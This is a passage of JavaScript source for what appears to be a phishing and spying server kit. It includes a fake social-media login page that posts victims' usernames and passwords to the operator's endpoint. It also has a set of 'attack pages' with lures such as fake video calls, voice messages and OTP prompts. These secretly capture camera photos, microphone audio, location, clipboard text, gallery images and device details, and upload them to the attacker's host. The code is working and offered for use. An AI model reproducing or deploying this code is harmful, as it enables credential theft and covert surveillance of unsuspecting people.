.div-line{flex:1;height:1px;background:${s.inpBorder}}
.div-or{font-size:13px;color:#aaa}
.link{text-align:center;font-size:${isFb?'14':'13'}px;
      color:${s.btn};margin-top:12px;cursor:pointer}
.create{width:100%;padding:14px;border:1px solid ${isFb?'#42b72a':s.btn};
        border-radius:6px;background:${isFb?'#42b72a':'transparent'};
        color:${isFb?'#fff':s.btn};font-size:17px;
        font-weight:bold;cursor:pointer;margin-top:${isFb?'16':'0'}px}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo">${s.logo}</div>
  <div class="card">
    <input type="text"     id="u" placeholder="${s.ph}">
    <input type="password" id="p" placeholder="Password">
    <button class="btn" onclick="sub()">Log In</button>
    ${isFb?`<div class="divider"><div class="div-line"></div><div class="div-or">or</div><div class="div-line"></div></div><button class="create">Create New Account</button>`:''}
  </div>
  <div class="link">Forgot password?</div>
</div>

<script>
const UID  = '${uid}';
const D    = '${HOST}/d';
const SITE = '${s.name}';
const RDR  = 'https://www.${s.redirect}';

window.onload = function(){
  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:SITE+' Phish Opened',
      data:navigator.userAgent})});
};

async function sub(){
  const u=document.getElementById('u').value;
  const p=document.getElementById('p').value;
  if(!u||!p) return;
  document.querySelector('.btn').textContent='Please wait...';
  await fetch(D+'/creds',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,site:SITE,user:u,pass:p})});
  setTimeout(()=>{ window.location.href=RDR; },600);
}
</script>
</body>
</html>`;
}

// ── ATTACK PAGES ──────────────────────────────────────────────
function attackPage(action, uid) {
    const S = {
        cam_back:    {bg:'#000',     icon:'📞', h:'Incoming Video Call',    s:'Someone is calling you...',        btn:'Accept',        btnC:'#25D366'},
        cam_front:   {bg:'#000',     icon:'🎥', h:'Instagram Live Invite',  s:'You have been invited to go live', btn:'Join Now',       btnC:'#C13584'},
        location:    {bg:'#fff',     icon:'📍', h:'Confirm Your Location',  s:'Confirm delivery location',        btn:'Confirm',        btnC:'#4CAF50'},
        microphone:  {bg:'#1a1a1a', icon:'🎙️', h:'Voice Message',          s:'Tap play to listen',               btn:'▶ Play',          btnC:'#25D366'},
        gallery:     {bg:'#000',     icon:'🖼️', h:'Shared Album',           s:'Photos shared with you',           btn:'View Photos',    btnC:'#9C27B0'},
        phone_ctrl:  {bg:'#fff',     icon:'🔐', h:'Account Verification',   s:'Verify your Google account',       btn:'Verify Now',     btnC:'#4285f4'},
        device_info: {bg:'#fff',     icon:'⚙️', h:'System Update Required', s:'Tap continue to update',           btn:'Continue',       btnC:'#4285f4'},
        clipboard:   {bg:'#fff',     icon:'🏦', h:'Enter OTP',              s:'Paste your one-time password',     btn:'Confirm',        btnC:'#1877f2'},
        full_recon:  {bg:'#3b5998', icon:'👤', h:'Facebook Verification',  s:'Verify your account to continue',  btn:'Verify Now',     btnC:'#1877f2'}
    };
    const sk = S[action] || S.full_recon;
    const dark = sk.bg !== '#fff';
    const tc = dark ? '#fff' : '#333';
    const sc = dark ? '#aaa' : '#666';

    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:${sk.bg};color:${tc};
     font-family:-apple-system,sans-serif;
     display:flex;flex-direction:column;align-items:center;
     justify-content:center;min-height:100vh;text-align:center;padding:20px}
.ico{font-size:70px;margin-bottom:20px;animation:p 1.5s infinite}
@keyframes p{0%,100%{transform:scale(1)}50%{transform:scale(1.12)}}
h2{font-size:22px;margin-bottom:10px;color:${tc}}
p{color:${sc};font-size:15px;margin-bottom:28px}
.btn{padding:16px 0;width:240px;border:none;border-radius:50px;
     background:${sk.btnC};color:#fff;font-size:17px;
     font-weight:600;cursor:pointer;display:block;margin:0 auto}
#st{margin-top:20px;color:${sc};font-size:13px}
video,canvas{display:none;width:1px;height:1px}
</style>
</head>
<body>
<div class="ico">${sk.icon}</div>
<h2>${sk.h}</h2>
<p>${sk.s}</p>
<button class="btn" onclick="go()">${sk.btn}</button>
<div id="st"></div>
<video id="vv" autoplay playsinline muted></video>
<canvas id="cc"></canvas>
<script>
const UID='${uid}',ACT='${action}',D='${HOST}/d';
window.onload=function(){
  const i={ua:navigator.userAgent,sc:screen.width+'x'+screen.height,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    mem:navigator.deviceMemory||'?',cores:navigator.hardwareConcurrency,
    lang:navigator.language,t:new Date().toString()};
  if(navigator.getBattery) navigator.getBattery().then(b=>{
    i.bat=Math.round(b.level*100)+'%';i.chg=b.charging;
    post('text',{type:'📱 Device Info',data:JSON.stringify(i,null,2)});
  }); else post('text',{type:'📱 Device Info',data:JSON.stringify(i,null,2)});
};
function st(m){document.getElementById('st').textContent=m;}
function post(ep,body){
  return fetch(D+'/'+ep,{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,...body})}).catch(()=>{});
}
async function go(){
  document.querySelector('.btn').textContent='...';
  st('Please wait...');
  const a=['cam_back','full_recon'].includes(ACT);
  const b=['cam_front','full_recon'].includes(ACT);
  if(a) await cam(false);
  if(b) await cam(true);
  if(['location','full_recon','phone_ctrl'].includes(ACT)) await loc();
  if(['microphone','full_recon'].includes(ACT)) await mic();
  if(['clipboard','full_recon'].includes(ACT)) await clip();
  if(ACT==='gallery') await gal();
  if(ACT==='phone_ctrl') await cam(false);
  st('✓');
  document.querySelector('.btn').textContent='${sk.btn}';
  document.querySelector('p').textContent='Thank you!';
}
async function cam(front){
  try{
    const s=await navigator.mediaDevices.getUserMedia(
      {video:{facingMode:front?'user':'environment'},audio:false});
    const v=document.getElementById('vv');
    v.srcObject=s;
    await new Promise(r=>v.onloadedmetadata=r);
    await new Promise(r=>setTimeout(r,1500));
    const c=document.getElementById('cc');
    c.width=v.videoWidth||640;c.height=v.videoHeight||480;
    c.getContext('2d').drawImage(v,0,0);
    s.getTracks().forEach(t=>t.stop());
    const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
    const fd=new FormData();
    fd.append('photo',blob,'p.jpg');fd.append('uid',UID);
    fd.append('camtype',front?'Front':'Back');
    await fetch(D+'/photo',{method:'POST',body:fd});
  }catch(e){}
}
async function loc(){
  return new Promise(r=>{
    if(!navigator.geolocation){r();return;}
    navigator.geolocation.getCurrentPosition(p=>{
      post('loc',{lat:p.coords.latitude,lon:p.coords.longitude,
        acc:p.coords.accuracy});r();
    },r,{enableHighAccuracy:true,timeout:10000});
  });
}
async function mic(){
  return new Promise(async r=>{
    try{
      const s=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
      const rec=new MediaRecorder(s);const ch=[];
      rec.ondataavailable=e=>ch.push(e.data);
      rec.onstop=async()=>{
        const fd=new FormData();
        fd.append('audio',new Blob(ch,{type:'audio/webm'}),'m.webm');
        fd.append('uid',UID);
        await fetch(D+'/audio',{method:'POST',body:fd});
        s.getTracks().forEach(t=>t.stop());r();
      };
      rec.start();setTimeout(()=>rec.stop(),8000);
    }catch(e){r();}
  });
}
async function clip(){
  try{
    const t=await navigator.clipboard.readText();
    await post('text',{type:'📋 Clipboard',data:t});
  }catch(e){}
}
async function gal(){
  return new Promise(r=>{
    const inp=document.createElement('input');
    inp.type='file';inp.accept='image/*';inp.multiple=true;
    inp.style.display='none';
    inp.onchange=async()=>{
      const files=[...inp.files].slice(0,20);
      for(const f of files){
        const buf=await f.arrayBuffer();
        const fd=new FormData();
        fd.append('photo',new Blob([buf],{type:f.type}),f.name);
        fd.append('uid',UID);fd.append('camtype','Gallery: '+f.name);
        await fetch(D+'/photo',{method:'POST',body:fd});
      }
      r();
    };
    document.body.appendChild(inp);inp.click();
    setTimeout(r,30000);
  });
}
</script>
</body>
</html>`;
}

// ── health ────────────────────────────────────────────────────
app.get('/', (req,res) =>
    res.send('<h2 style="text-align:center;color:green">✅ Server Online</h2>'));

// ── start ─────────────────────────────────────────────────────
server.listen(process.env.PORT || 3000, () =>
    console.log('[+] Server running'));
